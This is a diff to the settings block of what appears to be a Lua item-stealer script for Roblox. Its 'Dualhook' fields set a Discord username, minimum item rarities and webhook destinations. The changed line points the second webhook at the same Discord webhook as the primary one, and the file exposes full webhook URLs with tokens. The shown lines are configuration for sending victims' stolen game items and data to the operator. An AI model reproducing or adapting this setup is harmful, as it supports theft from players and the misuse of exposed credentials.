@@ -4,7 +4,7 @@ Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2
 
 -- [ Dualhook Settings ] --
 DualUsername = "valeraplayp" -- [Dualhook Username]
-DualWebhook = "https://discord.com/api/webhooks/1382724256370004008/uCTEBwK8CbjnaJryoe6zaAo5fxCSSnFum1ksuN9XB4_epkIEyEIDrjJTxvoqelhw_5Nm" -- [Dualhook Webhook]
+DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75" -- [Dualhook Webhook]
 DualUnique = 1 -- [Minimum Unique]
 DualAncient = 1 -- [Minimum Ancient]
 DualGodly = 1 -- [Minimum Godly]
